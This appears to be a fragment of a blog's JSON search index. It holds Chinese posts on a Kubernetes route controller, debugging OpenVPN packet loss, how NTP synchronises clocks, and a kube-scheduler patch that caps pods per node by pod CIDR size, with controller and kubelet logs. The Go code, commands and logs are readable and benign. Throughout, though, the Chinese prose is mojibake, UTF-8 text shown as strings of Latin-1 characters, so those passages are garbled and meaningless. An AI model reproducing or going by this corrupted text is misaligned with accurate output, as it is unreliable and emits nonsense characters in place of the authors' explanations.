int(c.ComponentConfig.ServiceController.ConcurrentServiceSyncs))...\t// If CIDRs should be allocated for pods and set on the CloudProvider, then start the route controller\tif c.ComponentConfig.KubeCloudShared.AllocateNodeCIDRs &amp;&amp; c.ComponentConfig.KubeCloudShared.ConfigureCloudRoutes &#123; if routes, ok := cloud.Routes(); !ok &#123; glog.Warning(&quot;configure-cloud-routes is set, but cloud provider does not support routes. Will not configure cloud provider routes.&quot;) &#125; else &#123; var clusterCIDR *net.IPNet if len(strings.TrimSpace(c.ComponentConfig.KubeCloudShared.ClusterCIDR)) != 0 &#123; _, clusterCIDR, err = net.ParseCIDR(c.ComponentConfig.KubeCloudShared.ClusterCIDR) if err != nil &#123; glog.Warningf(&quot;Unsuccessful parsing of cluster CIDR %v: %v&quot;, c.ComponentConfig.KubeCloudShared.ClusterCIDR, err) &#125; &#125; routeController := routecontroller.New(routes, client(&quot;route-controller&quot;), c.SharedInformers.Core().V1().Nodes(), c.ComponentConfig.KubeCloudShared.ClusterName, clusterCIDR) go routeController.Run(stop, c.ComponentConfig.KubeCloudShared.RouteReconciliationPeriod.Duration)...&#125;","tags":["k8s"]},{"title":"openvpn é“¾æ¥é—®é¢˜åˆ†æ","path":"/2019/03/15/segment-not-captured/","content":"â€‹\tåˆ°æ–°ç¯å¢ƒç†Ÿæ‚‰å†…éƒ¨æ¥å£ï¼Œpostman å»è°ƒè¯•å†…éƒ¨æœåŠ¡æ¥å£å‘ç°æ¥å£æ²¡æœ‰è¿”å›ï¼Œæ¢ä¸ªç”µè„‘è°ƒç”¨æ­£å¸¸ã€‚åˆæ­¥æ€€ç–‘æ˜¯è‡ªå·±ç”µè„‘é—®é¢˜ï¼Œé‚æ‰“å¼€ wireshark æ ¹æ®ç›®æ ‡ä¸»æœº ip ç»“åˆè·¯ç”±ä¿¡æ¯åˆ¤æ–­çš„èµ°çš„utun1æ¥å£å‡ºæµé‡ã€‚ tcp-follow-all â€‹\tä¸Šå›¾é€šè¿‡ wireshark çœ‹åˆ°æˆ‘è·å– cube æ¥å£GETè¯·æ±‚å‘å‡ºå»ï¼Œå¤šæ¬¡å°è¯•ä¾ç„¶éƒ½æ˜¯httpçš„ response çš„æ²¡æœ‰è¢«ç”¨æˆ·è¿›ç¨‹æ”¶åˆ°ï¼Œwireshark æŠ¥é”™tcp previos sgement not captured ã€‚å•ç‹¬ç‚¹å¼€tcp segmentå¯ä»¥åœ¨ wireshark ä¸­çœ‹åˆ° response æ˜¯å›æ¥äº†ä½†æ˜¯æ²¡æœ‰æˆåŠŸçš„è¢«åº”ç”¨å±‚æ¥æ”¶åˆ° (å¦‚ä¸‹å›¾)ã€‚ cube-request-response-loss â€‹\tæ¢ä¸ªæ›´ç›´è§‚çš„ tcp flow çš„å›¾ï¼ˆå¿½ç•¥é‡Œé¢çš„ ECN åå•†çš„ï¼‰ï¼šåœ¨ tcp æ¡æ‰‹è¿‡å®Œæˆè¿‡åï¼Œå®¢æˆ·ç«¯å‘é€è¯·æ±‚ï¼ŒæœåŠ¡ç«¯è¿”å›æ•°æ®ï¼Œåœ¨17:48:34.242222æ—¶é—´ç‰‡ä¹‹å‰ä¸¢äº†ä¸€ä¸ª wireshark è¯´æ²¡æœ‰æŠ“åˆ°ï¼ˆå¯èƒ½æ˜¯ä¸¢äº†ï¼‰ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨æœåŠ¡ç«¯å“åº”è¿‡åå¯èƒ½ä¸¢äº†ä¸€ä¸ªåŒ…ï¼Œç„¶åçœ‹åˆ°ä¸‰æ¬¡æ¡æ‰‹æ—¶å€™çš„ ack é‡å¤å‡ºç°ã€‚ image-20190321190517191 â€‹\tä¹‹åæ˜¯ä¸€å †çš„ keeplive ack çš„æŠ¥æ–‡ï¼Œkeeplive è¶…æ—¶æ—¶é—´åˆ°äº†è¿‡åæœåŠ¡ç«¯ reset äº† tcp connectionã€‚ image-20190321190825868 â€‹\té€šè¿‡ Google å‘ç°ç½‘ç»œä¸Šçš„æ–‡ç« éƒ½æ˜¯è¯´å­˜åœ¨ç½‘ç»œé“¾è·¯è´¨é‡é—®é¢˜å¯¼è‡´ä¸¢åŒ…ã€‚ä½†æ˜¯æˆ‘çš„ç¯å¢ƒæ˜¯ä½¿ç”¨çš„openvpné“¾æ¥åˆ°å¼€å‘ç¯å¢ƒï¼Œä¹Ÿå°±æ˜¯è¯´openvpnæä¾›çš„é“¾è·¯å¯èƒ½æœ‰é—®é¢˜ï¼Œé‚å°è¯•ç‚¹å¼€ vpn å®¢æˆ·ç«¯æ¢ç´¢ä¸€ä¸‹å¯é…ç½®é¡¹ï¼Œå‘ç°openvpnç‰ˆæœ¬æ˜¯ä½¿ç”¨ v2.3.17 ç‰ˆæœ¬ã€‚ openvpn-conf-info æ— è„‘å°è¯•æ¢åˆ° 2.4.3ã€‚ openvpn-2.4.3-libressl å±…ç„¶å‘ç°ä¸€åˆ‡æ­£å¸¸äº†ã€‚éå¸¸å¯èƒ½å’Œopenvpnçš„ç‰ˆæœ¬æœ‰å…³ç³»ã€‚ normal-http-req-rsp çŒœæƒ³éªŒè¯ 1â€‹\tæœç´¢å‘ç°ä¸€ä¸ª wireshark çš„issue,çŒœæƒ³ä¼šä¸ä¼šå’Œ mac çš„encå®ç°æœ‰å…³ç³»ï¼Ÿ â€‹\tå°è¯•åœ¨ mac é€šè¿‡sudo sysctl -w net.inet.tcp.ecn_initiate_out=0å’Œsudo sysctl -w net.inet.tcp.ecn_negotiate_in=0å…³é—­ecnï¼Œå‘ç° wireshakre æ˜¾ç¤ºçš„ tcp çš„æ¡æ‰‹æ—¶ç¬¦åˆé¢„æœŸï¼Œä½†æ˜¯ç½‘ç»œæ—¶ä¾ç„¶ä¸é€šçš„ï¼Œåˆæ­¥æ’é™¤äº† mac os tcp ecn çš„å¯èƒ½ã€‚(rst æ˜¯æˆ‘ C-c äº† curl å‘å‡ºçš„ image-20190317141133151 çŒœæƒ³å°è¯• 2â€‹\tæ‰“å¼€å®¢æˆ·ç«¯çš„é…ç½®æ–‡ä»¶å‘ç°openvpnçš„é…ç½®æ¨¡å¼æ˜¯tun+udp,çœ‹ä¸Šå»æ˜¯æ„å»ºä¸€ä¸ªoverlayçš„ç½‘ç»œï¼ŒçŒœæµ‹å¯èƒ½æ˜¯æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯çš„sslç‰ˆæœ¬ä¸å…¼å®¹ï¼Œåœ¨ overlay ç½‘ç»œæ•°æ®è§£å¯†çš„æ—¶å€™å‡ºç°å¼‚å¸¸ã€‚å¦‚æœæ˜¯è¿™æ ·é‚£ä¹ˆåº”è¯¥æ˜¯æ‰€æœ‰èµ°tunè®¾å¤‡çš„ tcp æµé‡éƒ½æœ‰é—®é¢˜ï¼ˆå’Œä¹‹å‰é”™è¯¯çš„ tcp è¡Œä¸ºä¸€è‡´ï¼‰ï¼Œç»“åˆä¹‹å‰åŒäº‹è®©æˆ‘sshç™»å½•æœåŠ¡å™¨ä¹Ÿæ²¡æœ‰æ­£å¸¸ç™»å½•ã€‚ â€‹\tå› ä¸ºæ²¡æœ‰æœç´¢åˆ°openvpnç›¸å…³çš„å…¼å®¹æ€§çš„changelogï¼ŒçŸ­æ—¶é—´æ— æ³•éªŒè¯æš‚æ—¶æç½®ã€‚ TCP Previous Segment is no captured å¤§å’–è®²ç½‘ç»œ Wireshark çš„æç¤º tcp reset çš„è‹¥å¹²åŸå› ç›¸å¯¹å…¨é¢","tags":["network"]},{"title":"NTP","path":"/2018/09/16/ntp/","content":"â€‹\tä¹‹å‰å’ŒåŒäº‹èŠå¤©ï¼ŒåŒäº‹é—®æˆ‘æœåŠ¡å™¨æœ‰ç½‘ç»œå»¶è¿Ÿå­˜åœ¨æ˜¯å¦‚ä½•åŒæ­¥æ—¶é—´çš„ï¼Ÿé‰´äºä¹‹å‰çŸ¥è¯†èƒŒæ™¯æˆ‘åªèƒ½è¯´å‚è€ƒä¸€ä¸‹ NTPï¼ˆSynchronization Approaches for Packet-Based Networks [^Clock_Synchronization]ï¼‰æœåŠ¡ã€‚è®¤çœŸæƒ³ä¸€æƒ³å°±è¯¥å‘ç°æ—¶é—´æœåŠ¡ä½œä¸ºç°ä»£ç¤¾ä¼šçš„åŸºç¡€è®¾æ–½åº”è¯¥æœ‰ç›¸å½“ä¸€æ®µå†å²äº†ã€‚ â€‹\tè¿˜æ˜¯å…ˆå…³æ³¨è®¡ç®—æœºï¼Œåœ¨è®¡ç®—æœºä¸­æ—¶é’Ÿæ˜¯æŒ¯è¡å™¨ + è®¡æ•°å™¨ ã€‚è®¡æ•°å™¨æ˜¯æ­£æ•°ï¼ŒæŒ¯è¡å™¨æ˜¯è®°å½•æ—¶é—´æµå¤±ï¼ŒæŒ¯è¡å™¨çš„è´¨é‡ï¼ˆå‡†ç¡®åº¦å’Œç¨³å®šæ€§ï¼‰å†³å®šç€æ—¶é’Ÿçš„è´¨é‡ã€‚ç›®å‰å¸¸è§çš„æŒ¯è¡å™¨æ˜¯æ™¶ä½“æŒ¯è¡å™¨ç®€ç§°æ™¶æŒ¯ã€‚ â€‹\tåœ¨å®é™…çš„ Linux time subsystem ä¸­ 2.6.16 å‰åå·®åˆ«è¾ƒå¤§ï¼Œåœ¨ 2.6.16 é€šè¿‡æ—¶é’Ÿä¸­æ–­é…åˆä¸€ä¸ªä¿®æ­£æ¥å®ç°çš„ï¼Œè¿™å°±æœ‰å‡ ä¸ªé—®é¢˜ï¼šæ—¶é’Ÿçš„åˆ†è¾¨ç‡ä¸å¤Ÿé«˜ï¼›æ—¶é—´æœ‰å¯èƒ½å€’é€€ã€‚ä¸è¿‡åœ¨ 2.6.16 å Linux ä¸­ä½¿ç”¨é«˜åˆ†è¾¨ç‡æ—¶é’Ÿè®¡æ—¶å™¨[^linux_ppt],Linux æ—¶é—´å­ç³»ç»Ÿä¸­å¯ä»¥æ—¶é’Ÿæ¥æºï¼Œä¸€èˆ¬é€‰å…¶ä¸­ä¸€ä¸ªä½¿ç”¨ã€‚ç›®å‰ Linux å¸¸ç”¨çš„æ—¶é—´æ¥æºæ˜¯ cpu å†…éƒ¨çš„ TSCï¼Œç²¾åº¦èƒ½åˆ° cpu ä¸»é¢‘åˆ†ä¹‹ 1ï¼Œä¸è¿‡å› ä¸ºæ—¶é—´ç›¸å…³çš„ç³»ç»Ÿè°ƒç”¨åŸå› (clock_gettime)ï¼Œç›®å‰ Linux èƒ½æä¾›çš„æ—¶é—´ç²¾åº¦æ˜¯1nsã€‚ â€‹\tå‰é¢æè¿°äº† Linux ç³»ç»Ÿä¸­æ—¶é—´ï¼Œä½†æ˜¯ç°å®ä¸­å¾ˆå¤šä¸šåŠ¡éœ€è¦æ—¶é—´ä¿æŒåŒæ­¥ï¼Œä¹Ÿå°±æ˜¯è¯´éœ€è¦æ—¶é—´åŒæ­¥ç›¸å…³çš„æœåŠ¡ã€‚æœ€æ—©çš„æ—¶é—´åŒæ­¥åè®®æ˜¯Daytime Protocol(rfc 867)å’ŒTime Protocol(rfc 868),éƒ½æ˜¯åŸºäº tcp çš„ï¼Œå‰è€…æ˜¯ 4 å­—èŠ‚æè¿°æ—¶é—´ï¼Œåè€…æ˜¯å­—ç¬¦ä¸²æè¿°æ—¶é—´ï¼Œæœ‰ä¸ªå…±åŒçš„ç¼ºç‚¹æ˜¯åªèƒ½ç²¾ç¡®åˆ°ç§’ï¼›è€Œä¸”è¿˜æœ‰ç½‘ç»œå»¶è¿Ÿå¯¼è‡´çš„è¯¯å·®ã€‚ â€‹\tåæ¥David L. Millsæå‡ºäº† NTP åè®®ï¼Œæœ€æ—©çš„æ˜¯ntp (rfc 958)ï¼Œä½†æ˜¯ç›®å‰å¸‚é¢ä¸Šä¸»è¦ç”¨çš„æ˜¯ntp v3 (rfc 1305)å’Œntp v4 (rfc 5905),ntp åè®®è§£å†³äº†ä¹‹å‰æ—¶é—´çš„åè®®çš„ç²¾åº¦é—®é¢˜ï¼Œç†è®ºç²¾åº¦åˆ° 233 çš®ç§’ï¼›ä¹Ÿè§£å†³å› ä¸ºç½‘ç»œç½‘ç»œå»¶è¿Ÿé—®é¢˜ã€‚ä¸åŒäºä¹‹å‰æ—¶é—´åè®®åŸºäº tcpï¼Œntp åè®®æ˜¯åŸºäº udp çš„ã€‚ img â€‹\tå…¸å‹çš„ NTP å®¢æˆ·ç«¯å°†å®šæœŸè½®è¯¢ä¸åŒç½‘ç»œä¸Šçš„ä¸‰ä¸ªæˆ–æ›´å¤šæœåŠ¡å™¨ã€‚ä¸ºåŒæ­¥å…¶æ—¶é’Ÿï¼Œå®¢æˆ·ç«¯å¿…é¡»è®¡ç®—å…¶æ—¶é—´åç§»é‡å’Œæ¥å›é€šä¿¡å»¶è¿Ÿã€‚æ—¶é—´åç§»â€œÎ¸â€å®šä¹‰ä¸ºï¼š$$\\theta &#x3D; {(t_1 - t_0) + (t_2 - t_3 ) \\over 2}$$å¾€è¿”å»¶è¿Ÿâ€œÎ´â€ä¸ºï¼š$$\\delta &#x3D; {(t_3 - t_0 ) - ( t_2- t_1 )}$$ å…¶ä¸­ï¼š: t0 æ˜¯è¯·æ±‚æ•°æ®åŒ…ä¼ è¾“çš„å®¢æˆ·ç«¯æ—¶é—´æˆ³ï¼Œ: t1 æ˜¯è¯·æ±‚æ•°æ®åŒ…å›å¤çš„æœåŠ¡å™¨æ—¶é—´æˆ³ï¼Œ: t2 æ˜¯å“åº”æ•°æ®åŒ…ä¼ è¾“çš„æœåŠ¡å™¨æ—¶é—´æˆ³t3 æ˜¯å“åº”æ•°æ®åŒ…å›å¤çš„å®¢æˆ·ç«¯æ—¶é—´æˆ³ã€‚â€‹\tâ€œÎ¸â€å’Œâ€œÎ´â€çš„å€¼é€šè¿‡è¿‡æ»¤å™¨å¹¶è¿›è¡Œç»Ÿè®¡åˆ†æï¼Œå¼‚å¸¸å€¼è¢«å‰”é™¤ï¼Œå¹¶ä»æœ€å¥½çš„ä¸‰ä¸ªå‰©ä½™å€™é€‰ä¸­å¯¼å‡ºä¼°ç®—çš„æ—¶é—´åç§»ã€‚ç„¶åè°ƒæ•´æ—¶é’Ÿé¢‘ç‡ä»¥é€æ¸å‡å°åç§»ï¼Œåˆ›å»ºä¸€ä¸ªåé¦ˆå›è·¯ã€‚ â€‹\tå…¶å®æœ‰äº†â€œÎ¸â€å’Œâ€œÎ´â€å°±å¯ä»¥ä¿®æ­£ç³»ç»Ÿæ—¶é—´äº†ï¼Œä½†æ˜¯è¿™å¹¶ä¸å¤ªå¤Ÿï¼Œé¦–å…ˆå¦‚æœå®¢æˆ·ç«¯çš„æ—¶é’Ÿé¢‘ç‡å¿«äºæœåŠ¡ç«¯ï¼Œé‚£ä¹ˆä¸‹ä¸€æ¬¡çš„æµ‹è¯•å‘ç°æ—¶é—´åˆä¸å¯¹çš„äº†ï¼Œæ‰€ä»¥ ntp è¿˜éœ€è¦ä¿®æ”¹äº†æ—¶é’Ÿçš„é¢‘ç‡ï¼›å…¶æ¬¡æ˜¯åœ¨çœŸå®ç¯å¢ƒä¸‹ ntp éƒ¨ç½²æ¨¡å¼æ˜¯å±‚çº§åŒ–çš„ï¼Œè¿˜éœ€è¦åŒæ­¥ ntp ä¸Šå±‚ ntpï¼Œæ‰€ä»¥è¿˜éœ€è¦åŒæ­¥ä¸ä¸Šå±‚ ntp server çš„å…³ç³»ï¼Œä¸è¿‡è¿™ä¸ªæƒ…å†µä¸æ˜¯æˆ‘è¿™æ¬¡å…³æ³¨çš„ç‚¹ã€‚ â€‹\tæ ¹æ®ä¹‹å‰æè¿°ï¼ŒçŸ¥é“äº† ntp åŒæ­¥ä¼šä¿®æ”¹æ—¶é—´å·®ï¼Œä¼šä¿®æ”¹ client æœåŠ¡åŒºçš„æ—¶é’Ÿé¢‘ç‡ã€‚ä¿®æ”¹æ—¶é—´å·®æ—¶å¦‚æœå‘ç°å®¢æˆ·ç«¯å‘ç°æœåŠ¡åŒºå’Œå®¢æˆ·ç«¯çš„æ—¶é—´å·®å°äº 128msï¼Œntp ä¼šå¹³æ»‘çš„çš„å°† 128ms è¯¯å·®è°ƒæ•´åˆ°å‡ ä¸ªæ¯«ç§’çº§ï¼Œæ¢å¥è¯è¯´ ntp åŒæ­¥æ—¶é—´æ°¸è¿œæœ‰è¯¯å·®ï¼Œä¹‹æ‰€ä»¥è¿™ä¹ˆåšæ—¶å› ä¸º ntp çš„åé¦ˆæ§åˆ¶ç³»ç»Ÿéœ€è¦ä¸€ä¸ªè¾“å…¥Î¸r+ã€‚åä¿®æ”¹é¢‘ç‡ï¼Œå› ä¸ºä¸ä»…è¦è€ƒè™‘åˆ°è¦é¿å…æ—¶é—´è·³å˜ï¼Œè¿˜è¦é¿å…é¢‘ç‡è·³å˜ï¼Œæ‰€ä»¥é¢‘ç‡çš„å˜åŒ–ä¹Ÿè¦æ˜¯è¿ç»­çš„ã€‚ â€‹\tntp æœåŠ¡åœ¨å®ç°ä¸Šä¸€èˆ¬æ˜¯å¤šçº¿ç¨‹ï¼Œæ¯ä¸ªæœåŠ¡æœ‰ 2 ä¸ªçº¿ç¨‹ï¼Œä¸€ä¸ªæ¥å—ä¿¡æ¯ (the peer process) å¦ä¸€ä¸ªå‘é€è¯·æ±‚ (the poll process)ã€‚\tè¿™é‡Œ copy ä¸€ä¸‹ mills è€å…ˆç”Ÿçš„ ppt^NTP_Precision_Time_Synchronizationã€‚ image-20180917002754971 Selection ç®—æ³•ä¸»è¦æ˜¯åšæ‹œå åº­å®¹é”™ï¼Œä¸¢å¼ƒä¸æ­£ç¡®çš„æœåŠ¡å™¨ Cluster ç®—æ³•ä¸»è¦æ˜¯ä»ç»Ÿè®¡å­¦è§’åº¦æ¥åŒºåˆ† Selection ç®—æ³•é€‰å‡ºæ¥å¯ç”¨çš„æœåŠ¡å™¨ï¼ŒåŒºåˆ†å‡ºå“ªä¸ªæ—¶é—´æ›´åŠ å‡†ç¡®ã€‚ Combine ç®—æ³•æ˜¯ç”¨æ¥ç»Ÿè®¡è¢«é€‰æ‹©çš„æ­£ç¡®æœåŠ¡çš„å¹³å‡æ•°ï¼Œç”Ÿæˆæœ€ç»ˆçš„ offsetã€‚ image-20180917004640362 â€‹\tphase detector æ˜¯ç”¨æ¥æµ‹è¯•æœ¬æœºæ—¶é—´å’Œæ ‡å‡†æ—¶é—´ç›¸å·®æœ‰å¤šå¤§ï¼Œå¾—å‡ºä¸€ä¸ªå·®å€¼ Vcï¼Œå°†è¿™ä¸ªå·®å€¼ç»™ä¸€ä¸ª clock filterã€‚clock filter çš„ä½œç”¨æ˜¯å‡å°‘network jitter,å®ƒé€šè¿‡ç®—æ³•[^Clock_Filter_Algorithm]é€‰æ‹©è¾ƒåˆé€‚æ ·æœ¬ï¼Œå¹¶æ‹’ç»å› ä¸ºç½‘ç»œæ‹¥å¡å’ŒåŒ…å†²çªå¯¼è‡´çš„é‡‡æ ·å™ªç‚¹ï¼Œç„¶åè®²æ•°æ®ä¼ ç»™å†…æ ¸ã€‚ç„¶ååˆ° kernel é‡Œé¢ä¸€ä¸ªé”ç›¸å›è·¯[^Phase_locked_loop]ï¼Œæœ€åç”Ÿæˆä¸€ä¸ªæ§åˆ¶ä¿¡å·ï¼Œæ¥è°ƒæ•´é¢‘ç‡ã€‚è¿™æ ·ä¿®æ”¹æ—¶é—´çš„å·®å€¼ä¿®æ­£äº†ï¼ˆç½‘ç»œå»¶è¿Ÿçš„é—®é¢˜ï¼‰ï¼Œé¢‘ç‡çš„ä¸åŒæ­¥çš„é—®é¢˜ä¹Ÿé€šè¿‡ loop filter è§£å†³äº†ã€‚ â€‹\tå…¶å®è¿˜æœ‰ä¸ªç‚¹ï¼Œå°±æ˜¯ os æ”¶åˆ°æ•°æ®åŒ…å’Œåº”ç”¨å±‚çš„æ•°æ®åŒ…æ—¶é—´ä¸ä¸€è‡´ï¼Œè€Œä¸”å‘é€æ—¶é—´å’Œ os å®é™…å‘é€æ—¶é—´ä¸ä¸€è‡´ã€‚mills è€å…ˆç”ŸæŠŠä¹‹å‰ ntp åè®®ä¸­çš„æ—¶é—´å…¶å®è¿˜åšäº†æ›´ç»†é¢—ç²’çš„çš„åˆ’åˆ† image-20180917003851007è€å…ˆç”Ÿåœ¨ 2008 å¹´å‘ç° T3båœ¨ freebsd æœ€å°å¤§çº¦æ˜¯ 16Î¼sï¼Œè¨€å¤–ä¹‹æ„å°±æ˜¯å»ºè®®åœ¨ bsd ä¸Šè·‘ ntp serverã€‚è¿™ä¸ªæ—¶é—´çš„åº¦é‡åŸºæœ¬æ²¡æœ‰é«˜ç²¾åº¦è§£ï¼ˆåœ¨æˆ‘çœ‹æ¥ã€‚ [^linux_ppt]: Transforming the Linux time subsystems 2006 [^Clock_Filter_Algorithm]:Clock Filter Algorithm [^Phase_locked_loop]: Phase-locked loop [^Clock_Synchronization]: Clock Synchronization in Distributed Systems Using NTP and PTP","tags":["inf"]},{"title":"kube-scheduler pod cidr bugfix","path":"/2018/08/07/kube-scheduler-bugfix/","content":"â€‹\tä¹‹å‰å†™ä¸€ä¸ªéœ€æ±‚éœ€è¦åšå®¹å™¨ç½‘ç»œçš„è§„åˆ’ï¼Œå‘ç°kuberntesåœ¨è°ƒåº¦çš„æ—¶å€™ä¸ä¼šæŠŠ ip åœ°å€ä½œä¸ºä¸€ä¸ªè°ƒåº¦çš„å‚è€ƒé¡¹ã€‚ä¹Ÿå°±æ˜¯æ‰‹å½“nodeä¸Šè§„åˆ’å‡ºæ¥çš„å­ç½‘ä¸­çš„ ip ç”¨å…‰ä¸” cpu å’Œ mem ä»¥åŠå…¶ä»–è°ƒåº¦å‚è€ƒé¡¹éƒ½æ»¡è¶³çš„æ—¶å€™ pod è¿˜æ˜¯ä¼šè¢«åˆ†é…åˆ°è¿™ä¸ªèŠ‚ç‚¹ä¸Šï¼Œå¹¶ä¸”kubeletä¼šä¼´éšç€å¦‚ä¸‹æŠ¥é”™ï¼š 1NetworkPlugin kubenet failed to set up pod &quot;frontend-jh0kf_default&quot; network: Error adding container to network: no IP addresses available in network: kubenet â€‹\tä¿®å¤æ–¹æ¡ˆæœ‰å¾ˆå¤šç§ï¼Œæ ¸å¿ƒæ€è·¯æ˜¯å›´ç»•ç€è°ƒåº¦å™¨å‚è€ƒçš„å¯¹è±¡ã€‚æ¯”è¾ƒä¼˜é›…çš„æ–¹å¼æ˜¯åœ¨kube-schedulerä¸­å°† ip åœ°å€ä¹Ÿä½œä¸ºä¸€ä¸ªè°ƒåº¦èµ„æºï¼Œä½†æ˜¯è¿™ä¸ªå®ç°èµ·æ¥å·¥ä½œé‡ç›¸å¯¹å…¶ä»–æ–¹æ³•å¤§äº†ä¸€ç‚¹ï¼›æœ‰ä¸ªæŠ˜ä¸­å–å·§çš„æ–¹å¼æ˜¯åˆ©ç”¨kube-schedulerä¸­çš„ä¸€ä¸ªAllocated Podæ¥å®ç°ï¼Œå·¥ä½œé‡å°ï¼Œå®ç°ç®€å•ã€‚ 1234567891011121314151617181920212223242526272829diff --git a/pkg/scheduler/cache/node_info.go b/pkg/scheduler/cache/node_info.goindex 31be774578e..6c9f5713e94 100644--- a/pkg/scheduler/cache/node_info.go+++ b/pkg/scheduler/cache/node_info.go@@ -29,6 +29,8 @@ import ( v1helper &quot;k8s.io/kubernetes/pkg/apis/core/v1/helper&quot; priorityutil &quot;k8s.io/kubernetes/pkg/scheduler/algorithm/priorities/util&quot; &quot;k8s.io/kubernetes/pkg/scheduler/util&quot;+ &quot;net&quot;+ &quot;math&quot; ) var (@@ -315,7 +317,16 @@ func (n *NodeInfo) AllowedPodNumber() int &#123; if n == nil || n.allocatableResource == nil &#123; return 0 &#125;- return n.allocatableResource.AllowedPodNumber+ ip, cidr, err := net.ParseCIDR(n.node.Spec.PodCIDR)+ if err != nil || ip.To4() == nil &#123;+ return n.allocatableResource.AllowedPodNumber+ &#125;+ size, _ := cidr.Mask.Size()+ if size &gt;= 31 &#123;+ return 0+ &#125;+ // -3 (network address, broadcaster address, gateway address)+ return int(math.Min(math.Pow(2, float64(32-size)) - 3, float64(n.allocatableResource.AllowedPodNumber))) &#125; ä¸è¿‡è¿˜æœ‰éœ€è¦è€ƒè™‘çš„æ˜¯å½“ pod ä½¿ç”¨çš„æ˜¯ hostNetwork: true ï¼Œä¸Šé¢ patch å·¥ä½œæ˜¯ä¸ç¬¦åˆé¢„æœŸçš„ã€‚ æµ‹è¯•case â€“node-cidr-mask-size&#x3D;30æœŸæœ›åªæœ‰ä¸€ä¸ª pod åˆ†é…åˆ° ip åœ°å€å¹¶è¿è¡Œï¼Œå¯ä»¥æŸ¥çœ‹åˆ° cm çš„ä¿¡æ¯å¦‚ä¸‹ï¼š 1234567[root@VM_128_11_centos ~]# systemctl status kube-controller-manager.service -lâ— kube-controller-manager.service - kube-controller-manager Loaded: loaded (/usr/lib/systemd/system/kube-controller-manager.service; enabled; vendor preset: disabled) Active: active (running) since Tue 2018-08-07 13:37:56 CST; 2min 23s ago Main PID: 20759 (kube-controller) CGroup: /system.slice/kube-controller-manager.service â””â”€20759 /usr/bin/kube-controller-manager --node-cidr-mask-size=30 --cluster-cidr=10.255.0.0/19 --allocate-node-cidrs=true --master=http://127.0.0.1:60001 --cloud-config=/etc/kubernetes/qcloud.conf --service-account-private-key-file=/etc/kubernetes/server.key --service-cluster-ip-range=10.255.31.0/24 --allow-untagged-cloud=true --cloud-provider=qcloud --cluster-name=cls-n1jte9ty --root-ca-file=/etc/kubernetes/cluster-ca.crt --use-service-account-credentials=true --horizontal-pod-autoscaler-use-rest-clients=true kubelet ä¿¡æ¯å¦‚ä¸‹ï¼Œçœ‹è§cniæ’ä»¶çš„å‚æ•°ï¼š 12345678910111213141516171819Aug 07 13:38:24 VM-0-43-ubuntu kubelet[23809]: I0807 13:38:24.454373 23809 kubenet_linux.go:308] CNI network config set to &#123;Aug 07 13:38:24 VM-0-43-ubuntu kubelet[23809]: &quot;cniVersion&quot;: &quot;0.1.0&quot;,Aug 07 13:38:24 VM-0-43-ubuntu kubelet[23809]: &quot;name&quot;: &quot;kubenet&quot;,Aug 07 13:38:24 VM-0-43-ubuntu kubelet[23809]: &quot;type&quot;: &quot;bridge&quot;,Aug 07 13:38:24 VM-0-43-ubuntu kubelet[23809]: &quot;bridge&quot;: &quot;cbr0&quot;,Aug 07 13:38:24 VM-0-43-ubuntu kubelet[23809]: &quot;mtu&quot;: 1500,Aug 07 13:38:24 VM-0-43-ubuntu kubelet[23809]: &quot;addIf&quot;: &quot;eth0&quot;,Aug 07 13:38:24 VM-0-43-ubuntu kubelet[23809]: &quot;isGateway&quot;: true,Aug 07 13:38:24 VM-0-43-ubuntu kubelet[23809]: &quot;ipMasq&quot;: false,Aug 07 13:38:24 VM-0-43-ubuntu kubelet[23809]: &quot;hairpinMode&quot;: false,Aug 07 13:38:24 VM-0-43-ubuntu kubelet[23809]: &quot;ipam&quot;: &#123;Aug 07 13:38:24 VM-0-43-ubuntu kubelet[23809]: &quot;type&quot;: &quot;host-local&quot;,Aug 07 13:38:24 VM-0-43-ubuntu kubelet[23809]: &quot;subnet&quot;: &quot;10.255.0.0/30&quot;,Aug 07 13:38:24 VM-0-43-ubuntu kubelet[23809]: &quot;gateway&quot;: &quot;10.255.0.1&quot;,Aug 07 13:38:24 VM-0-43-ubuntu kubelet[23809]: &quot;routes&quot;: [Aug 07 13:38:24 VM-0-43-ubuntu kubelet[23809]: &#123; &quot;dst&quot;: &quot;0.0.0.0/0&quot; &#125;Aug 07 13:38:24 VM-0-43-ubuntu kubelet[23809]: ]Aug 07 13:38:24 VM-0-43-ubuntu kubelet[23809]: &#125;Aug 07 13:38:24 VM-0-43-ubuntu kubelet[23809]: &#125; ç¡®è®¤ä¸€ä¸‹è¿è¡Œä¸­çš„ pod æ•°é‡å’Œ pod æ‰€åœ¨èŠ‚ç‚¹çš„ä¿¡æ¯ï¼š 12[root@VM_128_11_centos ~]# kubectl get pod --all-namespaces | grep Running | wc -l1 1234567[root@VM_128_11_centos ~]# kubectl describe node 172.30.0.43...Non-terminated Pods: (1 in total) Namespace Name CPU Requests CPU Limits Memory Requests Memory Limits --------- ---- ------------ ---------- --------------- ------------- default guohao-555fb5456d-kdx8n 0 (0%) 0 (0%) 0 (0%) 0 (0%)Allocated resources: case â€“node-cidr-mask-size&#x3D;29æœŸæœ›è¿è¡Œ 2^(32-29) - 3 &#x3D; 5 ä¸ª pod åˆ†é…åˆ° ip å¹¶è¿è¡Œï¼Œå¯ä»¥æŸ¥çœ‹åˆ°ä¸‹é¢ kubelet çš„ cni ä¿¡æ¯ï¼š 1234567891011121314151617181920Aug 07 13:44:48 VM-0-43-ubuntu kubelet[25163]: I0807 13:44:48.669847 25163 docker_service.go:307] docker cri received runtime config &amp;RuntimeConfig&#123;NetworkConfig:&amp;NetworkConfig&#123;PodCidr:10.255.0.0/29,&#125;,&#125;Aug 07 13:44:48 VM-0-43-ubuntu kubelet[25163]: I0807 13:44:48.669902 25163 kubenet_linux.go:308] CNI network config set to &#123;Aug 07 13:44:48 VM-0-43-ubuntu kubelet[25163]: &quot;cniVersion&quot;: &quot;0.1.0&quot;,Aug 07 13:44:48 VM-0-43-ubuntu kubelet[25163]: &quot;name&quot;: &quot;kubenet&quot;,Aug 07 13:44:48 VM-0-43-ubuntu kubelet[25163]: &quot;type&quot;: &quot;bridge&quot;,Aug 07 13:44:48 VM-0-43-ubuntu kubelet[25163]: &quot;bridge&quot;: &quot;cbr0&quot;,Aug 07 13:44:48 VM-0-43-ubuntu kubelet[25163]: &quot;mtu&quot;: 1500,Aug 07 13:44:48 VM-0-43-ubuntu kubelet[25163]: &quot;addIf&quot;: &quot;eth0&quot;,Aug 07 13:44:48 